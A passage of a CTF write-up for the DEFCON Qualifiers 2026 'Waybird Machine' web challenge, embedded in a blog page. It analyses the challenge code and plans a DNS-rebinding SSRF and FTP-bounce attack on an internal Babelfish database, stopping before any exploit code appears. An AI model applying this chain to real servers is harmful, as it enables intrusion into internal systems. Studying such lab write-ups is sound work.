@@ -1,0 +1,1064 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href='https://fonts.googleapis.com/css?family=JetBrains Mono' rel='stylesheet'>
+	<link href='/global.css' rel='stylesheet'>
+	<title>DEFCON Qualifiers 2026 - Waybird Machine (26 Solves)</title>
+  </head>
+  <body class="bg-[url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTElEQVRYha1WWw7DMAjLquYYk7b7H7GTtq9UbWpsQ8fXVh4xJIAfz9f7227IZ9tC3do71bfW2lINPuvW3lP+w2cHgIxHUKZzDhu2yGeZjVAwV6d8EEh4BSw7V6fKvwNwDN37jWId/edYS1TCCqhIfwQ2fg/96QrmDNwyIkDKd+hPAOYgKijKLCt0DszCAKIrUfodQGbgVL9FZywzuqjPWSsie2ULH6HjoCT7kOUbiAI4FWGgYRdkZr4z9ZyxTdsQyR0bmGC1f6PDUIWYXLogCuwcrvzCbej0NRoqTvXUY7XbkA0V9l9t0ss2ZM5uu6kkjnrKB1Bm1fUdAYOUjDlmyov+hwCyC+n4ndEyVTGLEyr9nf0B50C2zJE4I9rmA5XH57wdSEorWSvyETIiNgUjSlWlXxAAU0ZZVRYYpWRD/rWOM7xCEhInuDqM2fwAG58SrpqDi2sAAAAASUVORK5CYII=')] flex flex-col place-items-center min-h-dvh">
+	<div class="flex flex-nowrap flex-row justify-between bg-(--color-background-one) text-(--color-plaintext) font-jetbrains border-b-2 border-(--color-grey-border) w-screen pt-1 sm:text-m cursor-default" id="navbar">
+	<div class="flex flex-row ml-2" id="tabs">
+		<div class="px-4 hover:border-(--color-plaintext) border-(--color-background-one) border-b-2" id="main-tab">
+			Main Page
+		</div>
+		<div class="px-4 hover:border-(--color-plaintext) border-(--color-background-one) border-b-2" id="canvas-tab">
+			Canvas Stuff
+		</div>
+		<div class="px-4 hover:border-(--color-plaintext) border-(--color-background-one) border-b-2" id="about-tab">
+			About
+		</div>
+	</div>
+	<div class="flex-row mr-4 hidden xl:flex" id="status">
+		<div class="px-7"><span class="text-(--color-primarygreen)">/ </span><span id="storage">51</span>%</div>
+		<div class="px-7"><span class="text-(--color-primarygreen)">RAM </span><span id="ram">56</span>%</div>
+		<div class="px-7"><span class="text-(--color-primarygreen)">CPU </span><span id="cpu">27</span>%</div>
+		<div class="px-7"><span class="text-(--color-primarygreen)">eth0 </span><span id="eth">192.168.48.137</span></div>
+		<div class="pl-7"><span class="text-(--color-primarygreen)"><span id="time">19:53</span></span></div>
+	</div>
+</div>
+<script defer>
+	var mainTab = document.getElementById("main-tab");
+	var canvasTab = document.getElementById("canvas-tab");
+	var aboutTab = document.getElementById("about-tab");
+
+	var storageEl = document.getElementById("storage");
+	var ramEl = document.getElementById("ram");
+	var cpuEl = document.getElementById("cpu");
+	var ethEl = document.getElementById("eth");
+	var timeEl = document.getElementById("time");
+
+	var currentLocation = window.location.pathname;
+	var tabSelectedStyle = "border-(--color-primarygreen)";
+	var tabHoveredStyle = "hover:border-(--color-plaintext)"
+	
+	// Handle navigation
+	mainTab.onclick = () => { window.location = "/" };
+	canvasTab.onclick = () => { window.location = "/canvas" };
+	aboutTab.onclick = () => { window.location = "/about" };
+
+	// Handle current tab highlight
+	switch (currentLocation.split("/")[1]) {
+		case "":
+			mainTab.classList.add(tabSelectedStyle);
+			mainTab.classList.remove(tabHoveredStyle);
+			break;
+		case "canvas":
+			canvasTab.classList.add(tabSelectedStyle);
+			canvasTab.classList.remove(tabHoveredStyle);
+			break;
+		case "about":
+			aboutTab.classList.add(tabSelectedStyle);
+			aboutTab.classList.remove(tabHoveredStyle);
+			break;
+	}
+
+	// Handle stat updates
+	var storage = 51;
+	var ram = 56;
+	var cpu = 27;
+
+	var options = {
+		hour: "numeric",
+		minute: "numeric",
+		hour12: false
+	}
+
+	var time = new Intl.DateTimeFormat(undefined, options).format(new Date);
+	timeEl.textContent = time;
+	setInterval(() => {
+		time = new Intl.DateTimeFormat(undefined, options).format(new Date);
+		timeEl.textContent = time;
+		var shouldUpdate = Math.round(Math.random()) == 1;
+		if (shouldUpdate) {
+			ramEl.textContent = Math.min(100, Math.max(0, Number(ramEl.textContent) + Math.round(Math.random())*Math.round(Math.random()*5) * (Math.round(Math.random()) ? -1 : 1)));
+			cpuEl.textContent = Math.min(100, Math.max(0, Number(cpuEl.textContent) + Math.round(Math.random())*Math.round(Math.random()*5) * (Math.round(Math.random()) ? -1 : 1)));
+		}
+	}, 2000)
+
+</script>
+
+
+	<div class="bg-(--color-background-one) box-border my-20 border-1 border-(--color-primarygreen) flex flex-col px-5 pb-5 overflow-x-auto font-jetbrains text-lg max-w-95/100 sm:max-w-70/100">
+		<div class="text-custom-dynamic text-(--color-plaintext)">
+			<p>This year I participated in the DEFCON qualifiers for the first time. Playing with Friendly Maltese Citizens, I worked with secu23, mirkhoff, m0z, four0four, null001, bmcyver, bradan, and zonkor on the Waybird Machine challenge. Although we didn't end up qualifying, getting to work on a challenge with these legendary players was an amazing experience for me. This writeup is an effort to save this memory!</p>
+<h1>Waybird Machine (26 Solves)</h1>
+<p>We're given the following files.</p>
+<pre class="language-sh"><code class="language-sh">├── babelfish
+│   ├── Dockerfile
+│   └── start-wrapper.sh
+├── docker-compose.yml
+├── nginx
+│   ├── Dockerfile
+│   └── nginx.conf
+└── web
+    ├── Dockerfile
+    ├── bbbird_archive
+    │   ├── app
+    │   │   ├── __init__.py
+    │   │   ├── db.py
+    │   │   ├── routes.py
+    │   │   ├── scraper.py
+    │   │   ├── static
+    │   │   │   ├── css
+    │   │   │   │   └── style.css
+    │   │   │   ├── js
+    │   │   │   │   └── script.js
+    │   │   │   └── scraped
+    │   │   └── templates
+    │   │       ├── base.html
+    │   │       └── index.html
+    │   ├── config.py
+    │   └── requirements.txt
+    ├── policy.xml
+    └── run-web.sh
+
+<span class="token number">11</span> directories, <span class="token number">18</span> files</code></pre>
+<p>Browsing to the application, we can see that it's relatively simple.</p>
+<img class="m-auto border-1 border-(--color-grey-border) sm:w-200" src="/images/Screenshot 2026-05-31 140634.png">
+<p>Essentially, we're able to provide a URL (and optionally some credentials), which the application will then use to retrieve and archive an image.</p>
+<p>A quick attempt at reaching an internal address using this functionality shows that there's obviously some protections in place.</p>
+<img class="m-auto border-1 border-(--color-grey-border) sm:w-200" src="/images/Screenshot_2026-07-19_09-15-53.png">
+<p>Before we continue, lets quickly check where the flag is so that we can understand our goal.</p>
+<h2>The Flag</h2>
+<p>We can see that the flag is loaded into a config from an environment variable.</p>
+<h4><code>web/bbbird_archive/config.py</code></h4>
+<pre class="language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">:</span>
+    SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"SECRET_KEY"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    FLAG <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> <span class="token string">"bbb{hihellotestflag}"</span><span class="token punctuation">)</span>
+    <span class="token comment"># ...snip...</span></code></pre>
+<p>It is then added to a <code>flags</code> table in the DB during initialisation.</p>
+<h4><code>web/bbbird_archive/app/db.py</code></h4>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    create_db_cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+    IF DB_ID('birdarchive') IS NULL
+    BEGIN
+        CREATE DATABASE birdarchive;
+    END;
+    """</span>
+    <span class="token keyword">with</span> _conn<span class="token punctuation">(</span>database<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
+        <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>
+            cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>create_db_cmd<span class="token punctuation">)</span>
+        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment"># ...snip...</span>
+    insert_flag<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># insert the flag</span>
+
+<span class="token comment"># ...snip...</span>
+<span class="token keyword">def</span> <span class="token function">insert_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sql_cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+    INSERT INTO flags
+        (flag, is_hidden)
+    VALUES
+        (%s, %s);
+    SELECT SCOPE_IDENTITY() AS id;
+    """</span>
+    
+    <span class="token keyword">with</span> _conn<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
+        <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cursor<span class="token punctuation">:</span>
+            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>
+                sql_cmd<span class="token punctuation">,</span> <span class="token punctuation">(</span>
+                    app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"FLAG"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+                    <span class="token number">1</span> <span class="token comment"># is_hidden is set to 1</span>
+                <span class="token punctuation">)</span><span class="token punctuation">)</span>
+            row <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> row</code></pre>
+<p>Note that a <code>is_hidden</code> value was set to <code>1</code> when the flag was inserted. This value matters later in the <code>get_flags()</code> function, which only returns flags that have <code>is_hidden</code> set to <code>0</code>.</p>
+<h4><code>web/bbbird_archive/app/db.py</code></h4>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_flags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sql_cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+        SELECT flag from flags WHERE is_hidden = 0;
+    """</span>
+    <span class="token keyword">with</span> _conn<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
+        <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cursor<span class="token punctuation">:</span>
+            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql_cmd<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>Looking for calls to <code>get_flags()</code> shows this function gets called when we visit the main page of the application, suggesting that any unhidden flags will be printed there.</p>
+<h4><code>web/bbbird_archive/app/routes.py</code></h4>
+<pre class="language-python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        images <span class="token operator">=</span> db<span class="token punctuation">.</span>get_images<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+        images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        flags <span class="token operator">=</span> db<span class="token punctuation">.</span>get_flags<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        flags <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> images<span class="token operator">=</span>images<span class="token punctuation">,</span> flags<span class="token operator">=</span>flags<span class="token punctuation">)</span></code></pre>
+<p>This makes our goal pretty clear. We need to update the flags <code>is_hidden</code> field in the database to <code>0</code>.</p>
+<h2>Back to the image fetch</h2>
+<p>Going back to the image fetching functionality, we find the <code>scrape()</code> function which is handling the image retrieval.</p>
+<h4><code>web/bbbird_archive/app/scraper.py</code></h4>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scrape</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth_user<span class="token punctuation">,</span> auth_pass<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    _validate_url<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    r <span class="token operator">=</span> _fetch<span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth_user<span class="token punctuation">,</span> auth_pass<span class="token punctuation">)</span>
+    <span class="token comment"># ...snip...</span></code></pre>
+<p>Looking into the <code>_validate_url</code> function, we see the code that was preventing us from accessing internal addresses.</p>
+<h4><code>web/bbbird_archive/app/scraper.py</code></h4>
+<pre class="language-python"><code class="language-python">ALLOWED_SCHEMES <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"http"</span><span class="token punctuation">,</span> <span class="token string">"https"</span><span class="token punctuation">]</span>
+BLOCKED_NETWORKS <span class="token operator">=</span> <span class="token punctuation">[</span>
+    ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span><span class="token string">"127.0.0.0/8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span><span class="token string">"10.0.0.0/8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span><span class="token string">"172.16.0.0/12"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span><span class="token string">"192.168.0.0/16"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span><span class="token string">"169.254.0.0/16"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span><span class="token string">"::1/128"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span><span class="token string">"fc00::/7"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span><span class="token string">"fe80::/10"</span><span class="token punctuation">)</span>
+<span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">_validate_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parsed <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> parsed<span class="token punctuation">.</span>scheme <span class="token keyword">not</span> <span class="token keyword">in</span> ALLOWED_SCHEMES<span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> ScrapeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Unsupported URL scheme: </span><span class="token interpolation"><span class="token punctuation">{</span>parsed<span class="token punctuation">.</span>scheme<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+    hostname <span class="token operator">=</span> parsed<span class="token punctuation">.</span>hostname
+    <span class="token keyword">if</span> <span class="token keyword">not</span> hostname<span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> ScrapeError<span class="token punctuation">(</span><span class="token string">"URL has no hostname"</span><span class="token punctuation">)</span>
+   
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        resolved <span class="token operator">=</span> socket<span class="token punctuation">.</span>getaddrinfo<span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>gaierror<span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> ScrapeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Cannot resolve hostname: </span><span class="token interpolation"><span class="token punctuation">{</span>hostname<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">for</span> family<span class="token punctuation">,</span> _<span class="token punctuation">,</span> _<span class="token punctuation">,</span> _<span class="token punctuation">,</span> sockaddr <span class="token keyword">in</span> resolved<span class="token punctuation">:</span>
+        ip <span class="token operator">=</span> ipaddress<span class="token punctuation">.</span>ip_address<span class="token punctuation">(</span>sockaddr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> ipaddress<span class="token punctuation">.</span>IPv6Address<span class="token punctuation">)</span> <span class="token keyword">and</span> ip<span class="token punctuation">.</span>ipv4_mapped <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>ipv4_mapped
+        
+        <span class="token keyword">for</span> network <span class="token keyword">in</span> BLOCKED_NETWORKS<span class="token punctuation">:</span>
+            <span class="token keyword">if</span> ip <span class="token keyword">in</span> network<span class="token punctuation">:</span>
+                <span class="token keyword">raise</span> ScrapeError<span class="token punctuation">(</span><span class="token string">"Access to private/internal addresses is not allowed"</span><span class="token punctuation">)</span> <span class="token comment"># here's our error</span>
+    
+    <span class="token keyword">return</span> parsed</code></pre>
+<p>We can see that the validation process involves the following steps:</p>
+<ol>
+<li>Parse the users URL</li>
+<li>Check that the URL has a hostname</li>
+<li>Resolve the hostname</li>
+<li>Check that the resolved IP address does not exist in the denied ranges</li>
+</ol>
+<p>This is already suspicious, because as we saw earlier in the <code>scrape</code> function <code>_validate_url</code> is a point-in-time validation and its results are not stored or used in the subsequent <code>_fetch</code> call.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scrape</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth_user<span class="token punctuation">,</span> auth_pass<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    _validate_url<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token comment"># validate</span>
+    r <span class="token operator">=</span> _fetch<span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth_user<span class="token punctuation">,</span> auth_pass<span class="token punctuation">)</span> <span class="token comment"># fetch using original url</span>
+    <span class="token comment"># ...snip...</span></code></pre>
+<p>This means we can likely use DNS rebinding to bypass this check and make requests to internal resources.</p>
+<h2>What's worth targeting?</h2>
+<p>With the assumption that we can use DNS rebinding to request internal resources, what's actually worth targeting? To get some initial ideas, we can look at the entrypoint for the <code>web</code> container, which starts up the main services.</p>
+<h4><code>web/run-web.sh</code></h4>
+<pre class="language-sh"><code class="language-sh"><span class="token shebang important">#!/bin/sh</span>
+<span class="token builtin class-name">set</span> <span class="token parameter variable">-e</span>
+
+<span class="token builtin class-name">echo</span> <span class="token string">"Waiting for Babelfish..."</span>
+<span class="token keyword">while</span> <span class="token operator">!</span> python <span class="token parameter variable">-c</span> <span class="token string">"import pymssql; pymssql.connect(server='localhost', port=1433, user='babelfish_user', password='12345678').close()"</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">do</span>
+    <span class="token function">sleep</span> <span class="token number">2</span>
+<span class="token keyword">done</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"Babelfish ready."</span>
+
+python <span class="token parameter variable">-m</span> pyftpdlib <span class="token parameter variable">-D</span> <span class="token parameter variable">--port</span> <span class="token number">21</span> <span class="token parameter variable">-w</span> <span class="token parameter variable">-d</span> /app/app/static/scraped <span class="token operator">&amp;</span>
+
+flask init-db
+
+<span class="token builtin class-name">exec</span> gunicorn <span class="token parameter variable">--bind</span> <span class="token number">0.0</span>.0.0:8000 <span class="token parameter variable">--workers</span> <span class="token number">4</span> <span class="token parameter variable">--timeout</span> <span class="token number">120</span> <span class="token string">'app:app'</span></code></pre>
+<p>This tells us that:</p>
+<ul>
+<li>A babelfish instance is running. Babelfish acts as a translation layer between an MS-SQL client and a PostgreSQL DB. It does this by exposing a port (port <code>1433</code>) that handles the TDS protocol (the protocol used by MS-SQL). Incoming TDS packets are translated and forwarded to PostgreSQL.</li>
+<li>PostgreSQL is running on port <code>5432</code> (inferred by the existance of babelfish, but can be easily confirmed).</li>
+<li>An FTP server is running on port <code>21</code>.</li>
+<li>The web server runs on port <code>8000</code>.</li>
+</ul>
+<p>Another important detail is that direct traffic to PostgreSQL on port <code>5432</code> is blocked using iptables.</p>
+<h4><code>babelfish/start-wrapper.sh</code></h4>
+<pre class="language-sh"><code class="language-sh"><span class="token shebang important">#!/bin/sh</span>
+<span class="token comment"># Block TCP access to PostgreSQL </span>
+<span class="token comment"># Yes, you could mess with listen_addresses and such in the entrypoint, but that doesn't work or it blocks both TDS and PostgreSQL</span>
+iptables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">5432</span> <span class="token parameter variable">-j</span> REJECT
+ip6tables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">5432</span> <span class="token parameter variable">-j</span> REJECT
+
+<span class="token comment"># Drop to postgres user and run original entrypoint</span>
+<span class="token builtin class-name">exec</span> setpriv --inh-caps<span class="token operator">=</span>-all --bounding-set<span class="token operator">=</span>-all <span class="token parameter variable">--reuid</span> postgres <span class="token parameter variable">--regid</span> postgres --init-groups -- /start.sh <span class="token string">"<span class="token variable">$@</span>"</span></code></pre>
+<p>The three things that stand out here are the babelfish instance, the iptables rules, and the FTP server. Weirdly, it seems like the FTP server is not used at all by any component of the challenge. The only interesting thing about it is that its configured to use the <code>/app/app/static/scraped</code> directory, which is where scraped images end up. This is suspicious, and reminded me of a challenge from ECSC 2025, where an FTP bounce attack could be used to interact with an internal database (<a href="https://github.com/attacking-lab/ecsc2025-service-firewall#flag-store-1-vuln-3">https://github.com/attacking-lab/ecsc2025-service-firewall#flag-store-1-vuln-3</a>).</p>
+<p>This idea actually matches up perfectly with our situation here. If we think about how we could connect the dots, we can theorise an attack path<sup><a href="#notes"><b><code>1</code></b></a></sup>:</p>
+<ol>
+<li>Cause an image to be scraped. This &quot;image&quot; will actually be a file containing the raw bytes of packets that can be sent to the database (via TDS, rather than PostgreSQL directly because it's blocked).</li>
+<li>Use DNS rebinding to perform an FTP bounce attack that sends the content of the image to the database.</li>
+<li>If the FTP bounce attack is successful, then the flag should no longer be hidden, and we can retrieve it.</li>
+</ol>
+<p>To see if this attack chain is possible, we'll simply try to PoC out each individual step.</p>
+<h2>Scraping an Image Containing TDS Packets</h2>
+<p>Initially, this seems difficult, since the application won't just download any file we point it at. The <code>scrape()</code> function checks the validity of the image using ImageMagicks <code>identify</code> command.</p>
+<h4><code>web/bbbird_archive/app/scraper.py</code></h4>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">scrape</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth_user<span class="token punctuation">,</span> auth_pass<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    _validate_url<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    r <span class="token operator">=</span> _fetch<span class="token punctuation">(</span>url<span class="token punctuation">,</span> auth_user<span class="token punctuation">,</span> auth_pass<span class="token punctuation">)</span>
+    
+    content_type <span class="token operator">=</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+    ext <span class="token operator">=</span> MIMETYPE_TO_EXT<span class="token punctuation">.</span>get<span class="token punctuation">(</span>content_type<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> ext<span class="token punctuation">:</span>
+        parsed <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        ext <span class="token operator">=</span> Path<span class="token punctuation">(</span>parsed<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span>suffix
+        
+    tmp <span class="token operator">=</span> tempfile<span class="token punctuation">.</span>NamedTemporaryFile<span class="token punctuation">(</span>delete<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token operator">=</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"UPLOAD_FOLDER"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> suffix<span class="token operator">=</span>ext<span class="token punctuation">)</span>
+    
+    <span class="token comment"># ...snip...</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+    <span class="token comment"># ...snip...</span>
+        meta <span class="token operator">=</span> verify<span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> meta <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> ScrapeError<span class="token punctuation">(</span><span class="token string">"Image verification failed"</span><span class="token punctuation">)</span>
+
+        ext <span class="token operator">=</span> IMAGEMAGICK_FORMAT_TO_EXT<span class="token punctuation">.</span>get<span class="token punctuation">(</span>meta<span class="token punctuation">[</span><span class="token string">"format"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ext<span class="token punctuation">)</span>
+        safe_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>ext<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+        dest <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"UPLOAD_FOLDER"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> safe_name<span class="token punctuation">)</span>
+        shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>name<span class="token punctuation">,</span> dest<span class="token punctuation">)</span>
+
+        meta<span class="token punctuation">[</span><span class="token string">"file_size"</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span>dest<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> safe_name<span class="token punctuation">,</span> meta
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+    <span class="token comment"># ...snip...</span>
+
+<span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"identify"</span><span class="token punctuation">,</span> <span class="token string">"-format"</span><span class="token punctuation">,</span> <span class="token string">"%w %h %m"</span><span class="token punctuation">,</span> <span class="token string">"--"</span><span class="token punctuation">,</span> filepath<span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>TimeoutExpired<span class="token punctuation">:</span>
+    <span class="token comment"># ...snip... : checking that the output makes sense</span>
+    <span class="token keyword">return</span> <span class="token punctuation">{</span>
+        <span class="token string">"width"</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>width<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token string">"height"</span><span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>height<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token string">"format"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">}</span></code></pre>
